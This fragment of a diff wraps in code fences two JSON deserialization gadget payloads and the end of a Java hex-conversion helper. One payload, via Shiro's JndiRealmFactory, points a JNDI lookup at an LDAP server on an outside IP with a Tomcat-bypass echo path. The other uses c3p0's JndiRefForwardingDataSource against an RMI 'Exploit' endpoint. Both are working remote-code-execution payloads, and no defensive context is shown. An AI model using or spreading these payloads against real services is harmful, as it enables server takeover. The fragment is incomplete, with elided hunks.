@@ -1,6 +1,5 @@
+```
 {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory","jndiNames":["ldap://1.116.136.120:1600/TomcatBypass/TomcatEcho"],"Realms":[""],"a":"a"}
-
-
 
 {"object":["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"rmi://localhost:8088/Exploit", "loginTimeout":0}]}
 
@@ -31,3 +30,4 @@ public static String bytesToHexString(byte[] bArray, int length) {
     }
     return sb.toString();
 }
+```
